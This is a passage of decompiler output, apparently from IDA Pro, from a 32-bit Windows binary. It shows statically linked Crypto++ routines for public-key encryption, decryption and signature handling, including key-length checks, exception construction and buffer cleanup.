  void *v3; // ecx
  int v5[6]; // [esp+10h] [ebp-28h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  sub_419B80((int)v5, "PK_Signer: key too short for this signature scheme");
  v6 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v6) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 6;
  sub_419BE0((_DWORD *)this + 4, v5);
  v2 = v5[5];
  *(_DWORD *)this = &CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable';
  if ( v2 >= 0x10 )
  {
    v3 = (void *)v5[0];
    if ( v2 + 1 >= 0x1000 )
    {
      v3 = *(void **)(v5[0] - 4);
      if ( (unsigned int)(v5[0] - (_DWORD)v3 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v3);
  }
  *(_DWORD *)this = &CryptoPP::PK_SignatureScheme::KeyTooShort::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8D80: using guessed type void *CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable';
// 4B8D8C: using guessed type void *CryptoPP::PK_SignatureScheme::KeyTooShort::`vftable';

//----- (004348E0) --------------------------------------------------------
void __thiscall sub_4348E0(_DWORD *this)
{
  *this = &CryptoPP::ArraySink::`vftable';
  this[1] = &CryptoPP::ArraySink::`vftable';
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';

//----- (004348F0) --------------------------------------------------------
void __thiscall sub_4348F0(void *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  void *v7; // edx
  void (__thiscall ***v8)(_DWORD, int); // ecx

  *(_DWORD *)this = &CryptoPP::HashFilter::`vftable';
  *((_DWORD *)this + 1) = &CryptoPP::HashFilter::`vftable';
  *((_DWORD *)this + 6) = &CryptoPP::HashFilter::`vftable';
  v2 = *((_DWORD *)this + 26);
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)*((_DWORD *)this + 21);
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_16;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  *((_DWORD *)this + 25) = 0;
  *((_DWORD *)this + 26) = 15;
  *((_BYTE *)this + 84) = 0;
  v4 = *((_DWORD *)this + 20);
  if ( v4 < 0x10 )
    goto LABEL_11;
  v5 = (_DWORD *)*((_DWORD *)this + 15);
  if ( v4 + 1 >= 0x1000 )
  {
    if ( (unsigned int)v5 - *(v5 - 1) - 4 <= 0x1F )
    {
      v5 = (_DWORD *)*(v5 - 1);
      goto LABEL_10;
    }
LABEL_16:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_10:
  sub_46C87D(v5);
LABEL_11:
  *((_DWORD *)this + 19) = 0;
  *((_DWORD *)this + 20) = 15;
  *((_BYTE *)this + 60) = 0;
  *((_DWORD *)this + 6) = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v6 = *((_DWORD *)this + 9);
  v7 = (void *)*((_DWORD *)this + 10);
  if ( *((_DWORD *)this + 8) < v6 )
    v6 = *((_DWORD *)this + 8);
  memset(*((void **)this + 10), 0, v6);
  j_j___free_base(v7);
  v8 = (void (__thiscall ***)(_DWORD, int))*((_DWORD *)this + 3);
  if ( v8 )
    (**v8)(v8, 1);
}
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 4B8DD8: using guessed type void *CryptoPP::HashFilter::`vftable';
// 4B8E9C: using guessed type void *CryptoPP::HashFilter::`vftable';
// 4B8EAC: using guessed type void *CryptoPP::HashFilter::`vftable';

//----- (00434A01) --------------------------------------------------------
_DWORD *__thiscall sub_434A01(_DWORD *this, char a2)
{
  return sub_434A20(this - 1, a2);
}

//----- (00434A09) --------------------------------------------------------
void *__thiscall sub_434A09(char *this, char a2)
{
  return sub_434A50(this - 4, a2);
}

//----- (00434A11) --------------------------------------------------------
void *__thiscall sub_434A11(char *this, char a2)
{
  return sub_434A50(this - 24, a2);
}

//----- (00434A20) --------------------------------------------------------
_DWORD *__thiscall sub_434A20(_DWORD *this, char a2)
{
  *this = &CryptoPP::ArraySink::`vftable';
  this[1] = &CryptoPP::ArraySink::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';

//----- (00434A50) --------------------------------------------------------
void *__thiscall sub_434A50(void *this, char a2)
{
  sub_4348F0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00434A70) --------------------------------------------------------
int __thiscall sub_434A70(_DWORD **this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(*this[11] + 8))(this[11], a2);
  return a2;
}

//----- (00434A90) --------------------------------------------------------
unsigned int __thiscall sub_434A90(_DWORD *this)
{
  unsigned int v1; // eax

  v1 = this[4];
  if ( (unsigned __int64)v1 <= *((_QWORD *)this + 3) )
    return 0;
  else
    return v1 - this[6];
}

//----- (00434AD0) --------------------------------------------------------
int __stdcall sub_434AD0(_DWORD *a1)
{
  *a1 = 0;
  return 0;
}

//----- (00434AE0) --------------------------------------------------------
int __thiscall sub_434AE0(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[11] + 20))(this[11]);
}

//----- (00434AF0) --------------------------------------------------------
int __thiscall sub_434AF0(_DWORD *this, int a2, int a3, int a4, unsigned int a5, int a6, int a7)
{
  int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // ebx
  void *v11; // eax
  int *v12; // esi
  _DWORD *v13; // eax
  int v14; // edx
  unsigned int v15; // edx
  void *v16; // esi
  int *v17; // eax
  _DWORD *v18; // eax
  _DWORD *v19; // esi
  int v20; // edi
  unsigned int v21; // eax
  unsigned int v22; // edx
  void *v23; // esi
  void *v24; // edx
  unsigned int v26; // eax
  char *v27; // edi
  char *v28; // esi
  int v29; // eax
  char *v30; // eax
  int v31; // eax
  char *v32; // eax
  int v33; // eax
  char *v34; // eax
  _DWORD *v35; // eax
  int v36; // [esp-4h] [ebp-70h]
  int v37; // [esp+0h] [ebp-6Ch]
  int v38; // [esp+10h] [ebp-5Ch] BYREF
  unsigned int v39; // [esp+18h] [ebp-54h]
  unsigned int v40; // [esp+1Ch] [ebp-50h]
  void *Block; // [esp+20h] [ebp-4Ch]
  _DWORD v42[2]; // [esp+28h] [ebp-44h] BYREF
  unsigned int v43; // [esp+30h] [ebp-3Ch]
  unsigned int v44; // [esp+34h] [ebp-38h]
  void *v45; // [esp+38h] [ebp-34h]
  int v46; // [esp+40h] [ebp-2Ch]
  int v47; // [esp+44h] [ebp-28h]
  _DWORD *v48; // [esp+48h] [ebp-24h]
  int v49; // [esp+4Ch] [ebp-20h]
  int v50; // [esp+50h] [ebp-1Ch]
  int v51; // [esp+54h] [ebp-18h]
  _DWORD *v52; // [esp+58h] [ebp-14h]
  void *v53; // [esp+5Ch] [ebp-10h]
  int v54; // [esp+68h] [ebp-4h]
  char v55[24]; // [esp+6Ch] [ebp+0h] BYREF
  char v56[24]; // [esp+84h] [ebp+18h] BYREF
  char v57[24]; // [esp+9Ch] [ebp+30h] BYREF
  char v58[24]; // [esp+B4h] [ebp+48h] BYREF
  char v59[24]; // [esp+CCh] [ebp+60h] BYREF
  char v60[24]; // [esp+E4h] [ebp+78h] BYREF
  char v61[24]; // [esp+FCh] [ebp+90h] BYREF
  char pExceptionObject[40]; // [esp+114h] [ebp+A8h] BYREF
  char v63[8]; // [esp+13Ch] [ebp+D0h] BYREF
  int v64; // [esp+148h] [ebp+DCh]
  unsigned int v65; // [esp+14Ch] [ebp+E0h]
  void *v66; // [esp+150h] [ebp+E4h]

  v52 = this;
  v51 = a2;
  v49 = a4;
  v46 = a6;
  v47 = a7;
  v8 = *this;
  v50 = a5;
  if ( a5 != (*(int (__thiscall **)(_DWORD *))(v8 + 16))(this) )
  {
    v26 = (*(int (__thiscall **)(_DWORD *))(*this + 16))(this);
    v27 = (char *)sub_434410((int)v63, v26, 0xAu);
    v54 = 0;
    v28 = (char *)sub_434410((int)v61, a5, 0xAu);
    v29 = this[1];
    LOBYTE(v54) = 1;
    v30 = (char *)(*(int (__thiscall **)(_DWORD *, char *))(v29 + 8))(this + 1, v60);
    v31 = sub_421F20((int)v59, v30, ": ciphertext length of ");
    v32 = (char *)sub_4220E0((int)v58, v31, v28);
    v33 = sub_421F20((int)v57, v32, " doesn't match the required length of ");
    v34 = (char *)sub_4220E0((int)v56, v33, v27);
    v35 = (_DWORD *)sub_421F20((int)v55, v34, " for this key");
    LOBYTE(v54) = 7;
    sub_405230(pExceptionObject, v35);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v9 = sub_4355D0(this);
  v64 = -1;
  v10 = (v9 + 7) >> 3;
  v65 = v10;
  if ( v10 )
    v11 = sub_45AEA0((v9 + 7) >> 3);
  else
    v11 = 0;
  v53 = v11;
  v66 = v11;
  v54 = 9;
  v48 = v52 + 2;
  v12 = (int *)(*(int (__thiscall **)(_DWORD *))(v52[2] + 8))(v52 + 2);
  v13 = sub_43D570(&v38, v49, v50, 0, 1);
  v14 = *v12;
  LOBYTE(v54) = 10;
  (*(void (__thiscall **)(int *, _DWORD *, int, _DWORD *))(v14 + 12))(v12, v42, a3, v13);
  v15 = v40;
  v16 = Block;
  if ( v39 < v40 )
    v15 = v39;
  LOBYTE(v54) = 13;
  memset(Block, 0, 4 * v15);
  if ( v15 )
    j_j_unknown_libname_61(v16);
  else
    j_j___free_base(v16);
  LOBYTE(v54) = 12;
  if ( sub_440C10(v42) > v10 )
  {
    v17 = sub_4428E0();
    sub_43DBB0(v42, v17);
  }
  sub_441BE0(v42, (int)v53, v10, 0);
  v18 = (_DWORD *)(*(int (__thiscall **)(_DWORD *))(*v48 + 12))(v48);
  v37 = v47;
  v19 = v18;
  v36 = v46;
  v20 = *v18;
  v21 = sub_4355D0(v52);
  (*(void (__thiscall **)(_DWORD *, int, void *, unsigned int, int, int))(v20 + 16))(v19, v51, v53, v21, v36, v37);
  v22 = v44;
  v23 = v45;
  if ( v43 < v44 )
    v22 = v43;
  LOBYTE(v54) = 14;
  memset(v45, 0, 4 * v22);
  if ( v22 )
    j_j_unknown_libname_61(v23);
  else
    j_j___free_base(v23);
  v24 = v53;
  v54 = 15;
  memset(v53, 0, v10);
  j_j___free_base(v24);
  return v51;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 434AF0: using guessed type _DWORD var_130[2];
// 434AF0: using guessed type char var_1C[8];
// 434AF0: using guessed type char var_5C[24];
// 434AF0: using guessed type char var_74[24];
// 434AF0: using guessed type char var_8C[24];
// 434AF0: using guessed type char var_A4[24];
// 434AF0: using guessed type char var_BC[24];
// 434AF0: using guessed type char var_D4[24];
// 434AF0: using guessed type char var_EC[24];

//----- (00434D90) --------------------------------------------------------
void __thiscall sub_434D90(_DWORD *this, int a2, int a3, unsigned int a4, int a5, int a6)
{
  int v7; // eax
  void *v8; // eax
  int v9; // edx
  int *v10; // esi
  int v11; // edi
  unsigned int v12; // eax
  int v13; // eax
  unsigned int v14; // ebx
  int *v15; // esi
  _DWORD *v16; // eax
  int v17; // edx
  _DWORD *v18; // esi
  unsigned int v19; // eax
  unsigned int *v20; // ecx
  unsigned int v21; // edx
  unsigned int v22; // edx
  void *v23; // esi
  void *v24; // edx
  char *v25; // eax
  _DWORD *v26; // eax
  unsigned int v27; // eax
  char *v28; // edi
  char *v29; // esi
  int v30; // edx
  char *v31; // eax
  int v32; // eax
  char *v33; // eax
  int v34; // eax
  char *v35; // eax
  _DWORD *v36; // eax
  int v37; // [esp+0h] [ebp-6Ch]
  void *v38; // [esp+0h] [ebp-6Ch]
  int v39; // [esp+10h] [ebp-5Ch] BYREF
  unsigned int v40; // [esp+18h] [ebp-54h]
  unsigned int v41; // [esp+1Ch] [ebp-50h]
  void *v42; // [esp+20h] [ebp-4Ch]
  char v43[8]; // [esp+28h] [ebp-44h] BYREF
  unsigned int v44; // [esp+30h] [ebp-3Ch] BYREF
  unsigned int v45; // [esp+34h] [ebp-38h] BYREF
  void *Block; // [esp+38h] [ebp-34h]
  int v47; // [esp+40h] [ebp-2Ch]
  signed int v48; // [esp+44h] [ebp-28h]
  int v49; // [esp+48h] [ebp-24h]
  int v50; // [esp+4Ch] [ebp-20h]
  _DWORD *v51; // [esp+50h] [ebp-1Ch]
  int v52; // [esp+54h] [ebp-18h]
  unsigned int v53; // [esp+58h] [ebp-14h]
  void *v54; // [esp+5Ch] [ebp-10h]
  int v55; // [esp+68h] [ebp-4h]
  char v56[24]; // [esp+6Ch] [ebp+0h] BYREF
  char v57[24]; // [esp+84h] [ebp+18h] BYREF
  char v58[24]; // [esp+9Ch] [ebp+30h] BYREF
  char v59[24]; // [esp+B4h] [ebp+48h] BYREF
  char v60[24]; // [esp+CCh] [ebp+60h] BYREF
  char v61[40]; // [esp+E4h] [ebp+78h] BYREF
  char pExceptionObject[16]; // [esp+10Ch] [ebp+A0h] BYREF
  char v63[24]; // [esp+11Ch] [ebp+B0h] BYREF
  char v64[24]; // [esp+134h] [ebp+C8h] BYREF
  char v65[8]; // [esp+14Ch] [ebp+E0h] BYREF
  int v66; // [esp+158h] [ebp+ECh]
  void *v67; // [esp+15Ch] [ebp+F0h]
  void *v68; // [esp+160h] [ebp+F4h]

  v51 = this;
  v52 = a2;
  v49 = a3;
  v47 = a5;
  v50 = a6;
  v7 = *this;
  v53 = a4;
  if ( a4 > (*(int (__thiscall **)(_DWORD *))(v7 + 20))(this) )
  {
    if ( !(*(int (__thiscall **)(_DWORD *))(*this + 20))(this) )
    {
      v25 = (char *)(*(int (__thiscall **)(_DWORD *, char *))(this[1] + 8))(this + 1, v65);
      v55 = 1;
      v26 = (_DWORD *)sub_421F20((int)v64, v25, ": this key is too short to encrypt any messages");
      sub_405230(pExceptionObject, v26);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v27 = (*(int (__thiscall **)(_DWORD *))(*this + 20))(this);
    v28 = (char *)sub_434410((int)v64, v27, 0xAu);
    v55 = 2;
    v29 = (char *)sub_434410((int)v65, v53, 0xAu);
    v30 = this[1];
    LOBYTE(v55) = 3;
    v31 = (char *)(*(int (__thiscall **)(_DWORD *, char *))(v30 + 8))(this + 1, v60);
    v32 = sub_421F20((int)v59, v31, ": message length of ");
    v33 = (char *)sub_4220E0((int)v58, v32, v29);
    v34 = sub_421F20((int)v57, v33, " exceeds the maximum of ");
    v35 = (char *)sub_4220E0((int)v56, v34, v28);
    v36 = (_DWORD *)sub_421F20((int)v63, v35, " for this public key");
    LOBYTE(v55) = 9;
    sub_405230(v61, v36);
    _CxxThrowException(v61, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v66 = -1;
  v8 = (void *)((sub_41E530(this) + 7) >> 3);
  v48 = (signed int)v8;
  v67 = v8;
  if ( v8 )
    v8 = sub_45AEA0((size_t)v8);
  v54 = v8;
  v68 = v8;
  v9 = this[2];
  v55 = 11;
  v10 = (int *)(*(int (__thiscall **)(_DWORD *))(v9 + 12))(this + 2);
  v11 = *v10;
  v12 = sub_41E530(v51);
  (*(void (__thiscall **)(int *, int, int, unsigned int, void *, unsigned int, int))(v11 + 12))(
    v10,
    v52,
    v49,
    v53,
    v54,
    v12,
    v50);
  v13 = (*(int (__thiscall **)(_DWORD *))(this[2] + 8))(this + 2);
  v14 = v48;
  v15 = (int *)v13;
  v16 = sub_43D570(&v39, (int)v54, v48, 0, 1);
  v17 = *v15;
  LOBYTE(v55) = 12;
  v18 = (_DWORD *)(*(int (__thiscall **)(int *, char *, int, _DWORD *))(v17 + 20))(v15, v43, v52, v16);
  LOBYTE(v55) = 13;
  v19 = (*(int (__thiscall **)(_DWORD *, _DWORD))(*v51 + 16))(v51, 0);
  sub_441BE0(v18, v47, v19, v37);
  v20 = &v44;
  if ( v44 >= v45 )
    v20 = &v45;
  LOBYTE(v55) = 14;
  v38 = Block;
  v21 = *v20;
  memset(Block, 0, 4 * *v20);
  if ( v21 )
    j_j_unknown_libname_61(v38);
  else
    j_j___free_base(v38);
  v22 = v41;
  v23 = v42;
  if ( v40 < v41 )
    v22 = v40;
  LOBYTE(v55) = 15;
  memset(v42, 0, 4 * v22);
  if ( v22 )
    j_j_unknown_libname_61(v23);
  else
    j_j___free_base(v23);
  v24 = v54;
  v55 = 16;
  memset(v54, 0, v14);
  j_j___free_base(v24);
}
// 434EC7: variable 'v37' is possibly undefined
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 434D90: using guessed type char var_140[8];
// 434D90: using guessed type char var_9C[24];
// 434D90: using guessed type char var_B4[24];
// 434D90: using guessed type char var_CC[24];
// 434D90: using guessed type char var_E4[24];
// 434D90: using guessed type char var_FC[24];
// 434D90: using guessed type char var_4C[24];

//----- (00435080) --------------------------------------------------------
int __thiscall sub_435080(_DWORD *this, _DWORD *a2, void *a3, size_t a4)
{
  int *v5; // eax
  int v6; // edx
  int *v7; // ebx
  int v8; // eax
  int v9; // esi
  int v10; // eax
  unsigned int v11; // esi
  int v12; // eax
  int v13; // esi
  int v14; // eax
  unsigned int v15; // eax
  unsigned int v16; // eax
  int v17; // esi
  int v18; // eax
  int v20; // [esp-4h] [ebp-3Ch]
  char v21[8]; // [esp+10h] [ebp-28h] BYREF
  char v22[4]; // [esp+18h] [ebp-20h] BYREF
  int v23; // [esp+1Ch] [ebp-1Ch]
  int *v24; // [esp+20h] [ebp-18h]
  void *v25; // [esp+24h] [ebp-14h]
  _DWORD *v26; // [esp+28h] [ebp-10h]
  int v27; // [esp+34h] [ebp-4h]
  char v28[40]; // [esp+38h] [ebp+0h] BYREF
  char v29[40]; // [esp+60h] [ebp+28h] BYREF
  char pExceptionObject[16]; // [esp+88h] [ebp+50h] BYREF
  _DWORD v31[6]; // [esp+98h] [ebp+60h] BYREF

  v26 = this;
  v25 = a3;
  (*(void (__thiscall **)(_DWORD *, char *))(*this + 60))(this, v22);
  v5 = (int *)(*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  v6 = *a2;
  v7 = v5;
  v24 = v5;
  v8 = (*(int (__thiscall **)(_DWORD *))(v6 + 76))(a2);
  v9 = *v7;
  v10 = (*(int (__thiscall **)(int))(*(_DWORD *)v8 + 32))(v8);
  v11 = (*(int (__thiscall **)(int *, int, int))(v9 + 4))(v7, v23, v10);
  if ( sub_4353B0(v26) < v11 )
  {
    sub_434810(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v12 = (*(int (__thiscall **)(_DWORD *))(*a2 + 76))(a2);
  v13 = *v7;
  v14 = (*(int (__thiscall **)(int))(*(_DWORD *)v12 + 32))(v12);
  v20 = *(_DWORD *)((*(int (__thiscall **)(_DWORD *, char *, int))(*v26 + 60))(v26, v21, v14) + 4);
  v15 = sub_4353B0(v26);
  v16 = (*(int (__thiscall **)(int *, unsigned int, int))(v13 + 8))(v7, v15, v20);
  if ( !v16 )
  {
    sub_419B80((int)v31, "TF_SignerBase: this algorithm does not support message recovery or the key is too short");
    v27 = 0;
    sub_4053E0(v29, v31);
    _CxxThrowException(v29, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
  }
  if ( a4 > v16 )
  {
    sub_419B80((int)v31, "TF_SignerBase: the recoverable message part is too long for the given key and algorithm");
    v27 = 1;
    sub_405230(v28, v31);
    _CxxThrowException(v28, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_418F60(a2 + 1, v25, a4);
  v17 = *v24;
  v18 = (*(int (__thiscall **)(_DWORD *, void *, size_t, _DWORD, _DWORD, _DWORD *))(*a2 + 76))(
          a2,
          v25,
          a4,
          0,
          0,
          a2 + 13);
  return (*(int (__cdecl **)(int))(v17 + 20))(v18);
}
// 435080: using guessed type char var_9C[4];
// 435080: using guessed type char var_A4[8];
// 435080: using guessed type _DWORD var_1C[6];

//----- (00435210) --------------------------------------------------------
void __thiscall sub_435210(_DWORD *this, _DWORD *a2, int a3, int a4)
{
  int *v5; // edi
  int v6; // eax
  int v7; // esi
  int v8; // eax
  unsigned int v9; // eax
  _DWORD *v10; // edi
  unsigned int v11; // eax
  int *v12; // esi
  _DWORD *v13; // eax
  int v14; // edx
  unsigned int v15; // edx
  void *v16; // esi
  unsigned int v17; // esi
  int *v18; // eax
  unsigned int v19; // edx
  void *v20; // esi
  int v21; // [esp+10h] [ebp-7Ch] BYREF
  unsigned int v22; // [esp+18h] [ebp-74h]
  unsigned int v23; // [esp+1Ch] [ebp-70h]
  void *Block; // [esp+20h] [ebp-6Ch]
  char v25[4]; // [esp+28h] [ebp-64h] BYREF
  int v26; // [esp+2Ch] [ebp-60h]
  _DWORD v27[2]; // [esp+30h] [ebp-5Ch] BYREF
  unsigned int v28; // [esp+38h] [ebp-54h]
  unsigned int v29; // [esp+3Ch] [ebp-50h]
  void *v30; // [esp+40h] [ebp-4Ch]
  int v31; // [esp+48h] [ebp-44h]
  int v32; // [esp+4Ch] [ebp-40h]
  _DWORD *v33; // [esp+50h] [ebp-3Ch]
  char pExceptionObject[40]; // [esp+54h] [ebp-38h] BYREF
  int v35; // [esp+88h] [ebp-4h]

  v33 = this;
  v31 = a3;
  v32 = a4;
  (*(void (__thiscall **)(_DWORD *, char *))(*this + 68))(this, v25);
  v5 = (int *)(*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  v6 = (*(int (__thiscall **)(_DWORD *))(*a2 + 76))(a2);
  v7 = *v5;
  v8 = (*(int (__thiscall **)(int))(*(_DWORD *)v6 + 32))(v6);
  v9 = (*(int (__thiscall **)(int *, int, int))(v7 + 4))(v5, v26, v8);
  v10 = v33;
  if ( sub_4353B0(v33) < v9 )
  {
    sub_434810(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v11 = sub_4353B0(v10);
  sub_418EE0(a2 + 5, (v11 + 7) >> 3);
  v12 = (int *)(*(int (__thiscall **)(_DWORD *))(v10[2] + 8))(v10 + 2);
  v13 = sub_43D570(&v21, v31, v32, 0, 1);
  v14 = *v12;
  v35 = 0;
  (*(void (__thiscall **)(int *, _DWORD *, _DWORD *))(v14 + 28))(v12, v27, v13);
  v15 = v23;
  v16 = Block;
  if ( v22 < v23 )
    v15 = v22;
  LOBYTE(v35) = 3;
  memset(Block, 0, 4 * v15);
  if ( v15 )
    j_j_unknown_libname_61(v16);
  else
    j_j___free_base(v16);
  LOBYTE(v35) = 2;
  v17 = sub_4353B0(v33);
  if ( sub_440BD0(v27) > v17 )
  {
    v18 = sub_4428E0();
    sub_43DBB0(v27, v18);
  }
  sub_441BE0(v27, a2[8], a2[7], 0);
  v19 = v29;
  v20 = v30;
  if ( v28 < v29 )
    v19 = v28;
  v35 = 4;
  memset(v30, 0, 4 * v19);
  if ( v19 )
    j_j_unknown_libname_61(v20);
  else
    j_j___free_base(v20);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 435210: using guessed type char var_64[4];
// 435210: using guessed type _DWORD var_5C[2];

//----- (004353B0) --------------------------------------------------------
unsigned int __thiscall sub_4353B0(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  unsigned int v3; // eax
  unsigned int v4; // esi
  unsigned int v5; // edx
  void *v6; // ebx
  char v8[8]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v9; // [esp+18h] [ebp-1Ch]
  unsigned int v10; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v12; // [esp+30h] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
  v2 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v1 + 8))(v1, v8);
  v12 = 0;
  v3 = sub_440BD0(v2);
  if ( v3 <= 1 )
    v4 = 0;
  else
    v4 = v3 - 1;
  v5 = v10;
  v6 = Block;
  if ( v9 < v10 )
    v5 = v9;
  v12 = 1;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4353B0: using guessed type char var_24[8];

//----- (00435450) --------------------------------------------------------
void __cdecl sub_435450(int a1, int a2, int a3, int a4, int a5, int a6, int a7, char a8, unsigned int a9)
{
  _DWORD *v9; // eax
  _DWORD *v10; // esi
  int v12[27]; // [esp+1Ch] [ebp-7Ch] BYREF
  int v13; // [esp+94h] [ebp-4h]

  v9 = operator new(0x20u);
  v10 = v9;
  if ( a8 )
  {
    v13 = 0;
    if ( v9 )
    {
      sub_435E90(v9, 0);
      v10[3] = a2;
      v10[4] = a3;
      v10[6] = 0;
      v10[7] = 0;
      *v10 = &CryptoPP::ArrayXorSink::`vftable';
      v10[1] = &CryptoPP::ArrayXorSink::`vftable';
      goto LABEL_7;
    }
  }
  else
  {
    v13 = 1;
    if ( v9 )
    {
      sub_435E90(v9, 0);
      v10[3] = a2;
      *v10 = &CryptoPP::ArraySink::`vftable';
      v10[1] = &CryptoPP::ArraySink::`vftable';
      v10[4] = a3;
      v10[6] = 0;
      v10[7] = 0;
      goto LABEL_7;
    }
  }
  v10 = 0;
LABEL_7:
  v13 = -1;
  sub_452930(v12, a1, (int)v10, 0, -1, &dword_4EEDC0, &dword_4EEDC0);
  v13 = 2;
  while ( sub_434A90(v10) )
  {
    (*(void (__thiscall **)(int *, int, int, _DWORD, int))(v12[0] + 24))(v12, a4, a5, 0, 1);
    sub_437D00(v12, a9++, 1, 1);
    (*(void (__thiscall **)(int *, int, int, _DWORD, int))(v12[0] + 24))(v12, a6, a7, 0, 1);
    (*(void (__thiscall **)(int *, _DWORD, _DWORD, int, int))(v12[0] + 24))(v12, 0, 0, -1, 1);
  }
  sub_4348F0(v12);
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F7C: using guessed type void *CryptoPP::ArrayXorSink::`vftable';
// 4B9034: using guessed type void *CryptoPP::ArrayXorSink::`vftable';
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (004355D0) --------------------------------------------------------
unsigned int __thiscall sub_4355D0(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  unsigned int v3; // eax
  unsigned int v4; // esi
  unsigned int v5; // edx
  void *v6; // ebx
  char v8[8]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v9; // [esp+18h] [ebp-1Ch]
  unsigned int v10; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v12; // [esp+30h] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
  v2 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v1 + 4))(v1, v8);
  v12 = 0;
  v3 = sub_440BD0(v2);
  if ( v3 <= 1 )
    v4 = 0;
  else
    v4 = v3 - 1;
  v5 = v10;
  v6 = Block;
  if ( v9 < v10 )
    v5 = v9;
  v12 = 1;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4355D0: using guessed type char var_24[8];

//----- (00435670) --------------------------------------------------------
int __thiscall sub_435670(_DWORD *this, int a2, int a3, int a4)
{
  int *v5; // ebp
  int v6; // eax
  int v7; // esi
  int v8; // eax
  unsigned int v9; // esi
  int v10; // esi
  int v11; // edi
  unsigned int v12; // eax
  int v13; // eax
  int v14; // esi
  int result; // eax
  int v17; // [esp+1Ch] [ebp-34h] BYREF
  int v18; // [esp+20h] [ebp-30h]
  char pExceptionObject[12]; // [esp+24h] [ebp-2Ch] BYREF
  int v20; // [esp+30h] [ebp-20h]

  (*(void (__stdcall **)(int *))(*this + 68))(&v17);
  v5 = (int *)(*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  v6 = (*(int (__thiscall **)(int))(*(_DWORD *)a4 + 76))(a4);
  v7 = *v5;
  v8 = (*(int (__thiscall **)(int))(*(_DWORD *)v6 + 32))(v6);
  v9 = (*(int (__thiscall **)(int *, int, int))(v7 + 4))(v5, v18, v8);
  if ( sub_4353B0(this) < v9 )
  {
    sub_434810(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v10 = *(_DWORD *)(a4 + 32);
  v11 = *v5;
  v12 = sub_4353B0(this);
  v13 = (*(int (__thiscall **)(int, int, int, _DWORD, int, unsigned int, int))(*(_DWORD *)a4 + 76))(
          a4,
          v17,
          v18,
          *(unsigned __int8 *)(a4 + 116),
          v10,
          v12,
          a3);
  v14 = v20;
  (*(void (__thiscall **)(int *, int, int))(v11 + 32))(v5, v20, v13);
  result = v14;
  *(_BYTE *)(a4 + 116) = 1;
  return result;
}

